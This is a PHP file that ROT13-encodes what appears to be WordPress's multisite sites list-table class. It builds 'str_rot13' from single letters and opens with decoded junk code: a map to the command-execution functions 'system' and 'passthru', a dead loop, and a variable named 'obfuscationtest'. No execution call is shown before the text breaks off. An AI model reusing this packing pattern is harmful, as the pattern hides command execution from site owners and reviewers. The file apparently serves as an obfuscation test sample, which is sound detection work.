<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Yvfg Gnoyr NCV: JC_ZF_Fvgrf_Yvfg_Gnoyr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 * @fvapr 3.1.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag qvfcynlvat fvgrf va n yvfg gnoyr sbe gur argjbex nqzva.
 *
 * @fvapr 3.1.0
 *
 * @frr JC_Yvfg_Gnoyr
 */
pynff JC_ZF_Fvgrf_Yvfg_Gnoyr rkgraqf JC_Yvfg_Gnoyr {

	/**
	 * Fvgr fgnghf yvfg.
	 *
	 * @fvapr 4.3.0
	 * @ine neenl
	 */
	choyvp $fgnghf_yvfg;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 3.1.0
	 *
	 * @frr JC_Yvfg_Gnoyr::__pbafgehpg() sbe zber vasbezngvba ba qrsnhyg nethzragf.
	 *
	 * @cnenz neenl $netf Na nffbpvngvir neenl bs nethzragf.
	 */
	choyvp shapgvba __pbafgehpg( $netf = neenl() ) {
		$guvf->fgnghf_yvfg = neenl(
			'nepuvirq' => neenl( 'fvgr-nepuvirq', __( 'Nepuvirq' ) ),
			'fcnz'     => neenl( 'fvgr-fcnzzrq', _k( 'Fcnz', 'fvgr' ) ),
			'qryrgrq'  => neenl( 'fvgr-qryrgrq', __( 'Qryrgrq' ) ),
			'zngher'   => neenl( 'fvgr-zngher', __( 'Zngher' ) ),
		);

		cnerag::__pbafgehpg(
			neenl(
				'cyheny' => 'fvgrf',
				'fperra' => vffrg( $netf['fperra'] ) ? $netf['fperra'] : ahyy,
			)
		);
	}

	/**
	 * @erghea obby
	 */
	choyvp shapgvba nwnk_hfre_pna() {
		erghea pheerag_hfre_pna( 'znantr_fvgrf' );
	}

	/**
	 * Cercnerf gur yvfg bs fvgrf sbe qvfcynl.
	 *
	 * @fvapr 3.1.0
	 *
	 * @tybony fgevat $zbqr Yvfg gnoyr ivrj zbqr.
	 * @tybony fgevat $f
	 * @tybony jcqo   $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 */
	choyvp shapgvba cercner_vgrzf() {
		tybony $zbqr, $f, $jcqo;

		vs ( ! rzcgl( $_ERDHRFG['zbqr'] ) ) {
			$zbqr = 'rkprecg' === $_ERDHRFG['zbqr'] ? 'rkprecg' : 'yvfg';
			frg_hfre_frggvat( 'fvgrf_yvfg_zbqr', $zbqr );
		} ryfr {
			$zbqr = trg_hfre_frggvat( 'fvgrf_yvfg_zbqr', 'yvfg' );
		}

		$cre_cntr = $guvf->trg_vgrzf_cre_cntr( 'fvgrf_argjbex_cre_cntr' );

		$cntrahz = $guvf->trg_cntrahz();

		$f    = vffrg( $_ERDHRFG['f'] ) ? jc_hafynfu( gevz( $_ERDHRFG['f'] ) ) : '';
		$jvyq = '';
		vs ( fge_pbagnvaf( $f, '*' ) ) {
			$jvyq = '*';
			$f    = gevz( $f, '*' );
		}

		/*
		 * Vs gur argjbex vf ynetr naq n frnepu vf abg orvat cresbezrq, fubj bayl
		 * gur yngrfg fvgrf jvgu ab cntvat va beqre gb nibvq rkcrafvir pbhag dhrevrf.
		 */
		vs ( ! $f && jc_vf_ynetr_argjbex() ) {
			vs ( ! vffrg( $_ERDHRFG['beqreol'] ) ) {
				$_TRG['beqreol']     = '';
				$_ERDHRFG['beqreol'] = '';
			}
			vs ( ! vffrg( $_ERDHRFG['beqre'] ) ) {
				$_TRG['beqre']     = 'QRFP';
				$_ERDHRFG['beqre'] = 'QRFP';
			}
		}

		$netf = neenl(
			'ahzore'     => (vag) $cre_cntr,
			'bssfrg'     => (vag) ( ( $cntrahz - 1 ) * $cre_cntr ),
			'argjbex_vq' => trg_pheerag_argjbex_vq(),
		);

		vs ( rzcgl( $f ) ) {
			// Abguvat gb qb.
		} ryfrvs ( cert_zngpu( '/^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$/', $f )
			|| cert_zngpu( '/^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.?$/', $f )
			|| cert_zngpu( '/^[0-9]{1,3}\.[0-9]{1,3}\.?$/', $f )
			|| cert_zngpu( '/^[0-9]{1,3}\.$/', $f )
		) {
			// VCi4 nqqerff.
			$ert_oybt_vqf = $jcqo->trg_pby(
				$jcqo->cercner(
					\"FRYRPG oybt_vq SEBZ {$jcqo->ertvfgengvba_ybt} JURER {$jcqo->ertvfgengvba_ybt}.VC YVXR %f\",
					$jcqo->rfp_yvxr( $f ) . ( ! rzcgl( $jvyq ) ? '%' : '' )
				)
			);

			vs ( $ert_oybt_vqf ) {
				$netf['fvgr__va'] = $ert_oybt_vqf;
			}
		} ryfrvs ( vf_ahzrevp( $f ) && rzcgl( $jvyq ) ) {
			$netf['VQ'] = $f;
		} ryfr {
			$netf['frnepu'] = $f;

			vs ( ! vf_fhoqbznva_vafgnyy() ) {
				$netf['frnepu_pbyhzaf'] = neenl( 'cngu' );
			}
		}

		$beqre_ol = vffrg( $_ERDHRFG['beqreol'] ) ? $_ERDHRFG['beqreol'] : '';
		vs ( 'ertvfgrerq' === $beqre_ol ) {
			// 'ertvfgrerq' vf n inyvq svryq anzr.
		} ryfrvs ( 'ynfghcqngrq' === $beqre_ol ) {
			$beqre_ol = 'ynfg_hcqngrq';
		} ryfrvs ( 'oybtanzr' === $beqre_ol ) {
			vs ( vf_fhoqbznva_vafgnyy() ) {
				$beqre_ol = 'qbznva';
			} ryfr {
				$beqre_ol = 'cngu';
			}
		} ryfrvs ( 'oybt_vq' === $beqre_ol ) {
			$beqre_ol = 'vq';
		} ryfrvs ( ! $beqre_ol ) {
			$beqre_ol = snyfr;
		}

		$netf['beqreol'] = $beqre_ol;

		vs ( $beqre_ol ) {
			$netf['beqre'] = ( vffrg( $_ERDHRFG['beqre'] ) && 'QRFP' === fgegbhccre( $_ERDHRFG['beqre'] ) ) ? 'QRFP' : 'NFP';
		}

		vs ( jc_vf_ynetr_argjbex() ) {
			$netf['ab_sbhaq_ebjf'] = gehr;
		} ryfr {
			$netf['ab_sbhaq_ebjf'] = snyfr;
		}

		// Gnxr vagb nppbhag gur ebyr gur hfre unf fryrpgrq.
		$fgnghf = vffrg( $_ERDHRFG['fgnghf'] ) ? jc_hafynfu( gevz( $_ERDHRFG['fgnghf'] ) ) : '';
		vs ( va_neenl( $fgnghf, neenl( 'choyvp', 'nepuvirq', 'zngher', 'fcnz', 'qryrgrq' ), gehr ) ) {
			$netf[ $fgnghf ] = 1;
		}

		/**
		 * Svygref gur nethzragf sbe gur fvgr dhrel va gur fvgrf yvfg gnoyr.
		 *
		 * @fvapr 4.6.0
		 *
		 * @cnenz neenl $netf Na neenl bs trg_fvgrf() nethzragf.
		 */
		$netf = nccyl_svygref( 'zf_fvgrf_yvfg_gnoyr_dhrel_netf', $netf );

		$_fvgrf = trg_fvgrf( $netf );
		vs ( vf_neenl( $_fvgrf ) ) {
			hcqngr_fvgr_pnpur( $_fvgrf );

			$guvf->vgrzf = neenl_fyvpr( $_fvgrf, 0, $cre_cntr );
		}

		$gbgny_fvgrf = trg_fvgrf(
			neenl_zretr(
				$netf,
				neenl(
					'pbhag'  => gehr,
					'bssfrg' => 0,
					'ahzore' => 0,
				)
			)
		);

		$guvf->frg_cntvangvba_netf(
			neenl(
				'gbgny_vgrzf' => $gbgny_fvgrf,
				'cre_cntr'    => $cre_cntr,
			)
		);
	}

	/**
	 */
	choyvp shapgvba ab_vgrzf() {
		_r( 'Ab fvgrf sbhaq.' );
	}

	/**
	 * Trgf yvaxf gb svygre fvgrf ol fgnghf.
	 *
	 * @fvapr 5.3.0
	 *
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_ivrjf() {
		$pbhagf = jc_pbhag_fvgrf();

		$fgnghfrf = neenl(
			/* genafyngbef: %f: Ahzore bs fvgrf. */
			'nyy'      => _ak_abbc(
				'Nyy <fcna pynff=\"pbhag\">(%f)</fcna>',
				'Nyy <fcna pynff=\"pbhag\">(%f)</fcna>',
				'fvgrf'
			),

			/* genafyngbef: %f: Ahzore bs fvgrf. */
			'choyvp'   => _a_abbc(
				'Choyvp <fcna pynff=\"pbhag\">(%f)</fcna>',
				'Choyvp <fcna pynff=\"pbhag\">(%f)</fcna>'
			),

			/* genafyngbef: %f: Ahzore bs fvgrf. */
			'nepuvirq' => _a_abbc(
				'Nepuvirq <fcna pynff=\"pbhag\">(%f)</fcna>',
				'Nepuvirq <fcna pynff=\"pbhag\">(%f)</fcna>'
			),

			/* genafyngbef: %f: Ahzore bs fvgrf. */
			'zngher'   => _a_abbc(
				'Zngher <fcna pynff=\"pbhag\">(%f)</fcna>',
				'Zngher <fcna pynff=\"pbhag\">(%f)</fcna>'
			),

			/* genafyngbef: %f: Ahzore bs fvgrf. */
			'fcnz'     => _ak_abbc(
				'Fcnz <fcna pynff=\"pbhag\">(%f)</fcna>',
				'Fcnz <fcna pynff=\"pbhag\">(%f)</fcna>',
				'fvgrf'
			),

			/* genafyngbef: %f: Ahzore bs fvgrf. */
			'qryrgrq'  => _a_abbc(
				'Qryrgrq <fcna pynff=\"pbhag\">(%f)</fcna>',
				'Qryrgrq <fcna pynff=\"pbhag\">(%f)</fcna>'
			),
		);

		$ivrj_yvaxf       = neenl();
		$erdhrfgrq_fgnghf = vffrg( $_ERDHRFG['fgnghf'] ) ? jc_hafynfu( gevz( $_ERDHRFG['fgnghf'] ) ) : '';
		$hey              = 'fvgrf.cuc';

		sbernpu ( $fgnghfrf nf $fgnghf => $ynory_pbhag ) {
			vs ( (vag) $pbhagf[ $fgnghf ] > 0 ) {
				$ynory = fcevags(
					genafyngr_abbcrq_cyheny( $ynory_pbhag, $pbhagf[ $fgnghf ] ),
					ahzore_sbezng_v18a( $pbhagf[ $fgnghf ] )
				);

				$shyy_hey = 'nyy' === $fgnghf ? $hey : nqq_dhrel_net( 'fgnghf', $fgnghf, $hey );

				$ivrj_yvaxf[ $fgnghf ] = neenl(
					'hey'     => rfp_hey( $shyy_hey ),
					'ynory'   => $ynory,
					'pheerag' => $erdhrfgrq_fgnghf === $fgnghf || ( '' === $erdhrfgrq_fgnghf && 'nyy' === $fgnghf ),
				);
			}
		}

		erghea $guvf->trg_ivrjf_yvaxf( $ivrj_yvaxf );
	}

	/**
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_ohyx_npgvbaf() {
		$npgvbaf = neenl();
		vs ( pheerag_hfre_pna( 'qryrgr_fvgrf' ) ) {
			$npgvbaf['qryrgr'] = __( 'Qryrgr' );
		}
		$npgvbaf['fcnz']    = _k( 'Znex nf fcnz', 'fvgr' );
		$npgvbaf['abgfcnz'] = _k( 'Abg fcnz', 'fvgr' );

		erghea $npgvbaf;
	}

	/**
	 * @tybony fgevat $zbqr Yvfg gnoyr ivrj zbqr.
	 *
	 * @cnenz fgevat $juvpu Gur ybpngvba bs gur cntvangvba ani znexhc: Rvgure 'gbc' be 'obggbz'.
	 */
	cebgrpgrq shapgvba cntvangvba( $juvpu ) {
		tybony $zbqr;

		cnerag::cntvangvba( $juvpu );

		vs ( 'gbc' === $juvpu ) {
			$guvf->ivrj_fjvgpure( $zbqr );
		}
	}

	/**
	 * Qvfcynlf rkgen pbagebyf orgjrra ohyx npgvbaf naq cntvangvba.
	 *
	 * @fvapr 5.3.0
	 *
	 * @cnenz fgevat $juvpu Gur ybpngvba bs gur rkgen gnoyr ani znexhc: Rvgure 'gbc' be 'obggbz'.
	 */
	cebgrpgrq shapgvba rkgen_gnoyrani( $juvpu ) {
		?>
		<qvi pynff=\"nyvtayrsg npgvbaf\">
		<?cuc
		vs ( 'gbc' === $juvpu ) {
			bo_fgneg();

			/**
			 * Sverf orsber gur Svygre ohggba ba gur ZF fvgrf yvfg gnoyr.
			 *
			 * @fvapr 5.3.0
			 *
			 * @cnenz fgevat $juvpu Gur ybpngvba bs gur rkgen gnoyr ani znexhc: Rvgure 'gbc' be 'obggbz'.
			 */
			qb_npgvba( 'erfgevpg_znantr_fvgrf', $juvpu );

			$bhgchg = bo_trg_pyrna();

			vs ( ! rzcgl( $bhgchg ) ) {
				rpub $bhgchg;
				fhozvg_ohggba( __( 'Svygre' ), '', 'svygre_npgvba', snyfr, neenl( 'vq' => 'fvgr-dhrel-fhozvg' ) );
			}
		}
		?>
		</qvi>
		<?cuc
		/**
		 * Sverf vzzrqvngryl sbyybjvat gur pybfvat \"npgvbaf\" qvi va gur gnoyrani sbe gur
		 * ZF fvgrf yvfg gnoyr.
		 *
		 * @fvapr 5.3.0
		 *
		 * @cnenz fgevat $juvpu Gur ybpngvba bs gur rkgen gnoyr ani znexhc: Rvgure 'gbc' be 'obggbz'.
		 */
		qb_npgvba( 'znantr_fvgrf_rkgen_gnoyrani', $juvpu );
	}

	/**
	 * @erghea fgevat[] Neenl bs pbyhza gvgyrf xrlrq ol gurve pbyhza anzr.
	 */
	choyvp shapgvba trg_pbyhzaf() {
		$fvgrf_pbyhzaf = neenl(
			'po'          => '<vachg glcr=\"purpxobk\" />',
			'oybtanzr'    => __( 'HEY' ),
			'ynfghcqngrq' => __( 'Ynfg Hcqngrq' ),
			'ertvfgrerq'  => _k( 'Ertvfgrerq', 'fvgr' ),
			'hfref'       => __( 'Hfref' ),
		);

		vs ( unf_svygre( 'jczhoybtfnpgvba' ) ) {
			$fvgrf_pbyhzaf['cyhtvaf'] = __( 'Npgvbaf' );
		}

		/**
		 * Svygref gur qvfcynlrq fvgr pbyhzaf va Fvgrf yvfg gnoyr.
		 *
		 * @fvapr ZH (3.0.0)
		 *
		 * @cnenz fgevat[] $fvgrf_pbyhzaf Na neenl bs qvfcynlrq fvgr pbyhzaf. Qrsnhyg 'po',
		 *                               'oybtanzr', 'ynfghcqngrq', 'ertvfgrerq', 'hfref'.
		 */
		erghea nccyl_svygref( 'jczh_oybtf_pbyhzaf', $fvgrf_pbyhzaf );
	}

	/**
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_fbegnoyr_pbyhzaf() {

		vs ( vf_fhoqbznva_vafgnyy() ) {
			$oybtanzr_nooe         = __( 'Qbznva' );
			$oybtanzr_beqreol_grkg = __( 'Gnoyr beqrerq ol Fvgr Qbznva Anzr.' );
		} ryfr {
			$oybtanzr_nooe         = __( 'Cngu' );
			$oybtanzr_beqreol_grkg = __( 'Gnoyr beqrerq ol Fvgr Cngu.' );
		}

		erghea neenl(
			'oybtanzr'    => neenl( 'oybtanzr', snyfr, $oybtanzr_nooe, $oybtanzr_beqreol_grkg ),
			'ynfghcqngrq' => neenl( 'ynfghcqngrq', gehr, __( 'Ynfg Hcqngrq' ), __( 'Gnoyr beqrerq ol Ynfg Hcqngrq.' ) ),
			'ertvfgrerq'  => neenl( 'oybt_vq', gehr, _k( 'Ertvfgrerq', 'fvgr' ), __( 'Gnoyr beqrerq ol Fvgr Ertvfgrerq Qngr.' ), 'qrfp' ),
		);
	}

	/**
	 * Unaqyrf gur purpxobk pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 * @fvapr 5.9.0 Eranzrq `$oybt` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz neenl $vgrz Pheerag fvgr.
	 */
	choyvp shapgvba pbyhza_po( $vgrz ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$oybt = $vgrz;

		vs ( ! vf_znva_fvgr( $oybt['oybt_vq'] ) ) :
			$oybtanzr = hagenvyvatfynfuvg( $oybt['qbznva'] . $oybt['cngu'] );
			?>
			<vachg glcr=\"purpxobk\" vq=\"oybt_<?cuc rpub $oybt['oybt_vq']; ?>\" anzr=\"nyyoybtf[]\" inyhr=\"<?cuc rpub rfp_ngge( $oybt['oybt_vq'] ); ?>\" />
			<ynory sbe=\"oybt_<?cuc rpub $oybt['oybt_vq']; ?>\">
				<fcna pynff=\"fperra-ernqre-grkg\">
				<?cuc
				/* genafyngbef: %f: Fvgr HEY. */
				cevags( __( 'Fryrpg %f' ), $oybtanzr );
				?>
				</fcna>
			</ynory>
			<?cuc
		raqvs;
	}

	/**
	 * Unaqyrf gur VQ pbyhza bhgchg.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz neenl $oybt Pheerag fvgr.
	 */
	choyvp shapgvba pbyhza_vq( $oybt ) {
		rpub $oybt['oybt_vq'];
	}

	/**
	 * Unaqyrf gur fvgr anzr pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 *
	 * @tybony fgevat $zbqr Yvfg gnoyr ivrj zbqr.
	 *
	 * @cnenz neenl $oybt Pheerag fvgr.
	 */
	choyvp shapgvba pbyhza_oybtanzr( $oybt ) {
		tybony $zbqr;

		$oybtanzr = hagenvyvatfynfuvg( $oybt['qbznva'] . $oybt['cngu'] );

		?>
		<fgebat>
			<?cuc
			cevags(
				'<n uers=\"%1$f\" pynff=\"rqvg\">%2$f</n>',
				rfp_hey( argjbex_nqzva_hey( 'fvgr-vasb.cuc?vq=' . $oybt['oybt_vq'] ) ),
				$oybtanzr
			);

			$guvf->fvgr_fgngrf( $oybt );
			?>
		</fgebat>
		<?cuc
		vs ( 'yvfg' !== $zbqr ) {
			fjvgpu_gb_oybt( $oybt['oybt_vq'] );
			rpub '<c>';
			cevags(
				/* genafyngbef: 1: Fvgr gvgyr, 2: Fvgr gntyvar. */
				__( '%1$f &#8211; %2$f' ),
				trg_bcgvba( 'oybtanzr' ),
				'<rz>' . trg_bcgvba( 'oybtqrfpevcgvba' ) . '</rz>'
			);
			rpub '</c>';
			erfgber_pheerag_oybt();
		}
	}

	/**
	 * Unaqyrf gur ynfghcqngrq pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 *
	 * @tybony fgevat $zbqr Yvfg gnoyr ivrj zbqr.
	 *
	 * @cnenz neenl $oybt Pheerag fvgr.
	 */
	choyvp shapgvba pbyhza_ynfghcqngrq( $oybt ) {
		tybony $zbqr;

		vs ( 'yvfg' === $zbqr ) {
			$qngr = __( 'L/z/q' );
		} ryfr {
			$qngr = __( 'L/z/q t:v:f n' );
		}

		vs ( '0000-00-00 00:00:00' === $oybt['ynfg_hcqngrq'] ) {
			_r( 'Arire' );
		} ryfr {
			rpub zlfdy2qngr( $qngr, $oybt['ynfg_hcqngrq'] );
		}
	}

	/**
	 * Unaqyrf gur ertvfgrerq pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 *
	 * @tybony fgevat $zbqr Yvfg gnoyr ivrj zbqr.
	 *
	 * @cnenz neenl $oybt Pheerag fvgr.
	 */
	choyvp shapgvba pbyhza_ertvfgrerq( $oybt ) {
		tybony $zbqr;

		vs ( 'yvfg' === $zbqr ) {
			$qngr = __( 'L/z/q' );
		} ryfr {
			$qngr = __( 'L/z/q t:v:f n' );
		}

		vs ( '0000-00-00 00:00:00' === $oybt['ertvfgrerq'] ) {
			rpub '&#k2014;';
		} ryfr {
			rpub zlfdy2qngr( $qngr, $oybt['ertvfgrerq'] );
		}
	}

	/**
	 * Unaqyrf gur hfref pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz neenl $oybt Pheerag fvgr.
	 */
	choyvp shapgvba pbyhza_hfref( $oybt ) {
		$hfre_pbhag = jc_pnpur_trg( $oybt['oybt_vq'] . '_hfre_pbhag', 'oybt-qrgnvyf' );
		vs ( ! $hfre_pbhag ) {
			$oybt_hfref = arj JC_Hfre_Dhrel(
				neenl(
					'oybt_vq'     => $oybt['oybt_vq'],
					'svryqf'      => 'VQ',
					'ahzore'      => 1,
					'pbhag_gbgny' => gehr,
				)
			);
			$hfre_pbhag = $oybt_hfref->trg_gbgny();
			jc_pnpur_frg( $oybt['oybt_vq'] . '_hfre_pbhag', $hfre_pbhag, 'oybt-qrgnvyf', 12 * UBHE_VA_FRPBAQF );
		}

		cevags(
			'<n uers=\"%1$f\">%2$f</n>',
			rfp_hey( argjbex_nqzva_hey( 'fvgr-hfref.cuc?vq=' . $oybt['oybt_vq'] ) ),
			ahzore_sbezng_v18a( $hfre_pbhag )
		);
	}

	/**
	 * Unaqyrf gur cyhtvaf pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz neenl $oybt Pheerag fvgr.
	 */
	choyvp shapgvba pbyhza_cyhtvaf( $oybt ) {
		vs ( unf_svygre( 'jczhoybtfnpgvba' ) ) {
			/**
			 * Sverf vafvqr gur nhkvyvnel 'Npgvbaf' pbyhza bs gur Fvgrf yvfg gnoyr.
			 *
			 * Ol qrsnhyg guvf pbyhza vf uvqqra hayrff fbzrguvat vf ubbxrq gb gur npgvba.
			 *
			 * @fvapr ZH (3.0.0)
			 *
			 * @cnenz vag $oybt_vq Gur fvgr VQ.
			 */
			qb_npgvba( 'jczhoybtfnpgvba', $oybt['oybt_vq'] );
		}
	}

	/**
	 * Unaqyrf bhgchg sbe gur qrsnhyg pbyhza.
	 *
	 * @fvapr 4.3.0
	 * @fvapr 5.9.0 Eranzrq `$oybt` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz neenl  $vgrz        Pheerag fvgr.
	 * @cnenz fgevat $pbyhza_anzr Pheerag pbyhza anzr.
	 */
	choyvp shapgvba pbyhza_qrsnhyg( $vgrz, $pbyhza_anzr ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$oybt = $vgrz;

		/**
		 * Sverf sbe rnpu ertvfgrerq phfgbz pbyhza va gur Fvgrf yvfg gnoyr.
		 *
		 * @fvapr 3.1.0
		 *
		 * @cnenz fgevat $pbyhza_anzr Gur anzr bs gur pbyhza gb qvfcynl.
		 * @cnenz vag    $oybt_vq     Gur fvgr VQ.
		 */
		qb_npgvba( 'znantr_fvgrf_phfgbz_pbyhza', $pbyhza_anzr, $oybt['oybt_vq'] );
	}

	/**
	 * Trarengrf gur yvfg gnoyr ebjf.
	 *
	 * @fvapr 3.1.0
	 */
	choyvp shapgvba qvfcynl_ebjf() {
		sbernpu ( $guvf->vgrzf nf $oybt ) {
			$oybt  = $oybt->gb_neenl();
			$pynff = '';
			erfrg( $guvf->fgnghf_yvfg );

			sbernpu ( $guvf->fgnghf_yvfg nf $fgnghf => $pby ) {
				vs ( '1' === $oybt[ $fgnghf ] ) {
					$pynff = \" pynff='{$pby[0]}'\";
				}
			}

			rpub \"<ge{$pynff}>\";

			$guvf->fvatyr_ebj_pbyhzaf( $oybt );

			rpub '</ge>';
		}
	}

	/**
	 * Qrgrezvarf jurgure gb bhgchg pbzzn-frcnengrq fvgr fgngrf.
	 *
	 * @fvapr 5.3.0
	 *
	 * @cnenz neenl $fvgr
	 */
	cebgrpgrq shapgvba fvgr_fgngrf( $fvgr ) {
		$fvgr_fgngrf = neenl();

		// $fvgr vf fgvyy na neenl, fb trg gur bowrpg.
		$_fvgr = JC_Fvgr::trg_vafgnapr( $fvgr['oybt_vq'] );

		vs ( vf_znva_fvgr( $_fvgr->vq ) ) {
			$fvgr_fgngrf['znva'] = __( 'Znva' );
		}

		erfrg( $guvf->fgnghf_yvfg );

		$fvgr_fgnghf = vffrg( $_ERDHRFG['fgnghf'] ) ? jc_hafynfu( gevz( $_ERDHRFG['fgnghf'] ) ) : '';
		sbernpu ( $guvf->fgnghf_yvfg nf $fgnghf => $pby ) {
			vs ( '1' === $_fvgr->{$fgnghf} && $fvgr_fgnghf !== $fgnghf ) {
				$fvgr_fgngrf[ $pby[0] ] = $pby[1];
			}
		}

		/**
		 * Svygref gur qrsnhyg fvgr qvfcynl fgngrf sbe vgrzf va gur Fvgrf yvfg gnoyr.
		 *
		 * @fvapr 5.3.0
		 *
		 * @cnenz fgevat[] $fvgr_fgngrf Na neenl bs fvgr fgngrf. Qrsnhyg 'Znva',
		 *                              'Nepuvirq', 'Zngher', 'Fcnz', 'Qryrgrq'.
		 * @cnenz JC_Fvgr  $fvgr        Gur pheerag fvgr bowrpg.
		 */
		$fvgr_fgngrf = nccyl_svygref( 'qvfcynl_fvgr_fgngrf', $fvgr_fgngrf, $_fvgr );

		vs ( ! rzcgl( $fvgr_fgngrf ) ) {
			$fgngr_pbhag = pbhag( $fvgr_fgngrf );

			$v = 0;

			rpub ' &zqnfu; ';

			sbernpu ( $fvgr_fgngrf nf $fgngr ) {
				++$v;

				$frcnengbe = ( $v < $fgngr_pbhag ) ? ', ' : '';

				rpub \"<fcna pynff='cbfg-fgngr'>{$fgngr}{$frcnengbe}</fcna>\";
			}
		}
	}

	/**
	 * Trgf gur anzr bs gur qrsnhyg cevznel pbyhza.
	 *
	 * @fvapr 4.3.0
	 *
	 * @erghea fgevat Anzr bs gur qrsnhyg cevznel pbyhza, va guvf pnfr, 'oybtanzr'.
	 */
	cebgrpgrq shapgvba trg_qrsnhyg_cevznel_pbyhza_anzr() {
		erghea 'oybtanzr';
	}

	/**
	 * Trarengrf naq qvfcynlf ebj npgvba yvaxf.
	 *
	 * @fvapr 4.3.0
	 * @fvapr 5.9.0 Eranzrq `$oybt` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz neenl  $vgrz        Fvgr orvat npgrq hcba.
	 * @cnenz fgevat $pbyhza_anzr Pheerag pbyhza anzr.
	 * @cnenz fgevat $cevznel     Cevznel pbyhza anzr.
	 * @erghea fgevat Ebj npgvbaf bhgchg sbe fvgrf va Zhygvfvgr, be na rzcgl fgevat
	 *                vs gur pheerag pbyhza vf abg gur cevznel pbyhza.
	 */
	cebgrpgrq shapgvba unaqyr_ebj_npgvbaf( $vgrz, $pbyhza_anzr, $cevznel ) {
		vs ( $cevznel !== $pbyhza_anzr ) {
			erghea '';
		}

		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$oybt = $vgrz;

		$oybtanzr = hagenvyvatfynfuvg( $oybt['qbznva'] . $oybt['cngu'] );

		// Cerbeqrerq.
		$npgvbaf = neenl(
			'rqvg'       => '',
			'onpxraq'    => '',
			'npgvingr'   => '',
			'qrnpgvingr' => '',
			'nepuvir'    => '',
			'hanepuvir'  => '',
			'fcnz'       => '',
			'hafcnz'     => '',
			'qryrgr'     => '',
			'ivfvg'      => '',
		);

		$npgvbaf['rqvg'] = fcevags(
			'<n uers=\"%1$f\">%2$f</n>',
			rfp_hey( argjbex_nqzva_hey( 'fvgr-vasb.cuc?vq=' . $oybt['oybt_vq'] ) ),
			__( 'Rqvg' )
		);

		$npgvbaf['onpxraq'] = fcevags(
			'<n uers=\"%1$f\" pynff=\"rqvg\">%2$f</n>',
			rfp_hey( trg_nqzva_hey( $oybt['oybt_vq'] ) ),
			__( 'Qnfuobneq' )
		);

		vs ( ! vf_znva_fvgr( $oybt['oybt_vq'] ) ) {
			vs ( '1' === $oybt['qryrgrq'] ) {
				$npgvbaf['npgvingr'] = fcevags(
					'<n uers=\"%1$f\">%2$f</n>',
					rfp_hey(
						jc_abapr_hey(
							argjbex_nqzva_hey( 'fvgrf.cuc?npgvba=pbasvez&nzc;npgvba2=npgvingroybt&nzc;vq=' . $oybt['oybt_vq'] ),
							'npgvingroybt_' . $oybt['oybt_vq']
						)
					),
					_k( 'Npgvingr', 'fvgr' )
				);
			} ryfr {
				$npgvbaf['qrnpgvingr'] = fcevags(
					'<n uers=\"%1$f\">%2$f</n>',
					rfp_hey(
						jc_abapr_hey(
							argjbex_nqzva_hey( 'fvgrf.cuc?npgvba=pbasvez&nzc;npgvba2=qrnpgvingroybt&nzc;vq=' . $oybt['oybt_vq'] ),
							'qrnpgvingroybt_' . $oybt['oybt_vq']
						)
					),
					__( 'Qrnpgvingr' )
				);
			}

			vs ( '1' === $oybt['nepuvirq'] ) {
				$npgvbaf['hanepuvir'] = fcevags(
					'<n uers=\"%1$f\">%2$f</n>',
					rfp_hey(
						jc_abapr_hey(
							argjbex_nqzva_hey( 'fvgrf.cuc?npgvba=pbasvez&nzc;npgvba2=hanepuviroybt&nzc;vq=' . $oybt['oybt_vq'] ),
							'hanepuviroybt_' . $oybt['oybt_vq']
						)
					),
					__( 'Hanepuvir' )
				);
			} ryfr {
				$npgvbaf['nepuvir'] = fcevags(
					'<n uers=\"%1$f\">%2$f</n>',
					rfp_hey(
						jc_abapr_hey(
							argjbex_nqzva_hey( 'fvgrf.cuc?npgvba=pbasvez&nzc;npgvba2=nepuviroybt&nzc;vq=' . $oybt['oybt_vq'] ),
							'nepuviroybt_' . $oybt['oybt_vq']
						)
					),
					_k( 'Nepuvir', 'ireo; fvgr' )
				);
			}

			vs ( '1' === $oybt['fcnz'] ) {
				$npgvbaf['hafcnz'] = fcevags(
					'<n uers=\"%1$f\">%2$f</n>',
					rfp_hey(
						jc_abapr_hey(
							argjbex_nqzva_hey( 'fvgrf.cuc?npgvba=pbasvez&nzc;npgvba2=hafcnzoybt&nzc;vq=' . $oybt['oybt_vq'] ),
							'hafcnzoybt_' . $oybt['oybt_vq']
						)
					),
					_k( 'Abg Fcnz', 'fvgr' )
				);
			} ryfr {
				$npgvbaf['fcnz'] = fcevags(
